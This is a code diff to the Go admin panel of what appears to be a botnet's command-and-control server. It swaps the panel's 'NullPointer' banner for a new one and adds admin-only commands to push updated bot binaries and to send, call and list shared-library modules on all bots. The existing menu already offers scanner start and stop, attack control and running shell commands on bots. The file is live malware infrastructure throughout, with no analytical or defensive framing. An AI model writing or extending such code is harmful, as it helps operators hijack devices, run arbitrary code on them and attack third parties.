@@ -15,26 +15,31 @@ import (
 )
 
 type Admin struct {
-	conn net.Conn
+	conn     net.Conn
+	username string
+	R        *Render
 }
 
 func NewAdmin(conn net.Conn) *Admin {
-	return &Admin{conn}
+	return &Admin{conn, "", NewRender(conn)}
 }
 
-func (this *Admin) writeNullPointerAnim() {
-	c1, c2, c3 := "\033[38;5;52m", "\033[38;5;202m", "\033[38;5;196m"
-	this.conn.Write([]byte("\033[2J\033[1H\r\n"))
-
-	this.conn.Write([]byte(c1 + " __    __            __  __  _______             __             __                          \r\n"))
-	this.conn.Write([]byte(c1 + "|  \\\\  |  \\\\          |  \\\\|  \\\\|       \\\\           |  \\\\           |  \\\\                        \r\n"))
-	this.conn.Write([]byte(c1 + "| $$\\\\ | $$ __    __ | $$| $$| $$$$$$$\\\\  ______   \\\\$$ _______  _| $$_     ______    ______  \r\n"))
-	this.conn.Write([]byte(c2 + "| $$$\\\\| $$|  \\\\  |  \\\\| $$| $$| $$__/ $$ /      \\\\ |  \\\\|       \\\\|   $$ \\\\   /      \\\\  /      \\\\ \r\n"))
-	this.conn.Write([]byte(c2 + "| $$$$\\\\ $$| $$  | $$| $$| $$| $$    $$|  $$$$$$\\\\| $$| $$$$$$$\\\\\\\\$$$$$$  |  $$$$$$\\\\|  $$$$$$\\\\\r\n"))
-	this.conn.Write([]byte(c3 + "| $$\\\\$$ $$| $$  | $$| $$| $$| $$$$$$$ | $$  | $$| $$| $$  | $$ | $$ __ | $$    $$| $$   $$$$\r\n"))
-	this.conn.Write([]byte(c3 + "| $$ \\\\$$$$| $$__/ $$| $$| $$| $$      | $$__/ $$| $$| $$  | $$ | $$|  \\\\| $$$$$$$$| $$      \r\n"))
-	this.conn.Write([]byte(c3 + "| $$  \\\\$$$ \\\\$$    $$| $$| $$| $$       \\\\$$    $$| $$| $$  | $$  \\\\$$  $$ \\\\$$     \\\\| $$      \r\n"))
-	this.conn.Write([]byte(c3 + " \\\\$   \\\\$  \\\\$$$$$$  \\\\$ \\\\$ \\\\$        \\\\$$$$$$  \\\\$ \\\\$   \\\\$   \\\\$$$$   \\\\$$$$$$$ \\\\$ \033[0m\r\n\r\n"))
+func (this *Admin) writeBanner() {
+	this.conn.Write([]byte(CCls))
+	this.conn.Write([]byte("\r\n" +
+		CPink + "  ███████╗███████╗███╗   ███╗██████╗  ██████╗ ██╗   ██╗\r\n" +
+		CPink + "  ██╔════╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗╚██╗ ██╔╝\r\n" +
+		CPink + "  █████╗  █████╗  ██╔████╔██║██████╔╝██║   ██║ ╚████╔╝ \r\n" +
+		CPink + "  ██╔══╝  ██╔══╝  ██║╚██╔╝██║██╔══██╗██║   ██║  ╚██╔╝  \r\n" +
+		CPink + "  ██║     ███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝   ██║   \r\n" +
+		CPink + "  ╚═╝     ╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n" +
+		CGray + "  ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗\r\n" +
+		CGray + "  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝\r\n" +
+		CGray + "  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ \r\n" +
+		CGray + "  ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ \r\n" +
+		CGray + "  ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗\r\n" +
+		CGray + "  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝\r\n" +
+		CReset + "\r\n"))
 }
 
 func (this *Admin) Handle() {
@@ -47,14 +52,14 @@ func (this *Admin) Handle() {
 
 	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
 	this.conn.Write([]byte("\033[38;5;202m \r\n"))
-	this.conn.Write([]byte("\033[38;5;52musername\033[38;5;240m: \033[0m"))
+	this.R.LoginPrompt()
 	username, err := this.ReadLine(false)
 	if err != nil {
 		return
 	}
 
 	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-	this.conn.Write([]byte("\033[38;5;52mpassword\033[38;5;240m: \033[0m"))
+	this.R.PassPrompt()
 	password, err := this.ReadLine(true)
 	if err != nil {
 		return
@@ -62,6 +67,8 @@ func (this *Admin) Handle() {
 
 	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
 	this.conn.Write([]byte("\r\n"))
+
+	this.username = username
 
 	var loggedIn bool
 	var userInfo AccountInfo
@@ -95,7 +102,7 @@ func (this *Admin) Handle() {
 		}
 	}()
 
-	this.writeNullPointerAnim()
+	this.writeBanner()
 	online := clientList.Count()
 	if userInfo.maxBots != -1 && online > userInfo.maxBots {
 		online = userInfo.maxBots
@@ -106,12 +113,12 @@ func (this *Admin) Handle() {
 	for {
 		var botCatagory string
 		var botCount int
-		this.conn.Write([]byte("\033[38;5;240m[\033[38;5;52mNull\033[38;5;196mPointer\033[38;5;240m]\033[0;97m > "))
+		this.R.PromptWithCount(this.username, clientList.Count())
 		cmd, err := this.ReadLineWithHistory(false, &cmdHistory)
 
 		if cmd == "clear" || cmd == "cls" || cmd == "c" || cmd == "CLS" {
 			this.conn.Write([]byte("\033[2J\033[1H"))
-			this.writeNullPointerAnim()
+			this.writeBanner()
 			continue
 		}
 		if err != nil || cmd == "exit" || cmd == "quit" {
@@ -324,10 +331,14 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[38;5;202m  RMUSER      - remove user\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;202m  USERS       - list users\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;202m  BOTS        - distribution + count\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;202m  UPDATE      - update bot binary (all/arch)\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;202m  SELFUPDATE  - run cmd on bots\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;202m  SCANSTART   - start scanners\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;202m  SCANSTOP    - stop scanners\r\n"))
 			this.conn.Write([]byte("\x1b[38;5;202m  STOP        - stop attacks\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;202m  SENDMODULE  - send .so module to all bots\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;202m  CALLMODULE  - call function in loaded module\r\n"))
+			this.conn.Write([]byte("\x1b[38;5;202m  LISTMODULES - list loaded modules on bots\r\n"))
 			continue
 		}
 
@@ -776,6 +787,44 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte("\x1b[38;5;202mAttacks stopped on all bots\x1b[0m\r\n"))
 			continue
 		}
+		if baseCmd == "UPDATE" && userInfo.admin == 1 {
+			handleUpdateCommand(this, toolArg)
+			continue
+		}
+		if baseCmd == "UPDATE" && userInfo.admin == 0 {
+			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+			continue
+		}
+		if baseCmd == "SENDMODULE" && userInfo.admin == 1 {
+			tokens := strings.Split(toolArg, " ")
+			msg := handleSendModuleCommand(this, tokens)
+			this.conn.Write([]byte(msg))
+			continue
+		}
+		if baseCmd == "SENDMODULE" && userInfo.admin == 0 {
+			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+			continue
+		}
+		if baseCmd == "CALLMODULE" && userInfo.admin == 1 {
+			tokens := strings.Split(toolArg, " ")
+			msg := handleCallModuleCommand(this, tokens)
+			this.conn.Write([]byte(msg))
+			continue
+		}
+		if baseCmd == "CALLMODULE" && userInfo.admin == 0 {
+			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+			continue
+		}
+		if baseCmd == "LISTMODULES" && userInfo.admin == 1 {
+			msg := handleListModulesCommand(this, nil)
+			this.conn.Write([]byte(msg))
+			continue
+		}
+		if baseCmd == "LISTMODULES" && userInfo.admin == 0 {
+			this.conn.Write([]byte("\x1b[91madmin only\x1b[0m\r\n"))
+			continue
+		}
+
 		if baseCmd == "SELFUPDATE" && userInfo.admin == 1 {
 			shellCmd := toolArg
 			if shellCmd == "" {
@@ -855,7 +904,7 @@ func (this *Admin) ReadLineWithHistory(masked bool, history *[]string) (string, 
 
 	redrawLine := func(s string) {
 		this.conn.Write([]byte("\r\033[K"))
-		this.conn.Write([]byte("\033[38;5;240m[\033[38;5;52mNull\033[38;5;196mPointer\033[38;5;240m]\033[0;97m > "))
+		this.R.PromptUser(this.username)
 		this.conn.Write([]byte(s))
 	}
 
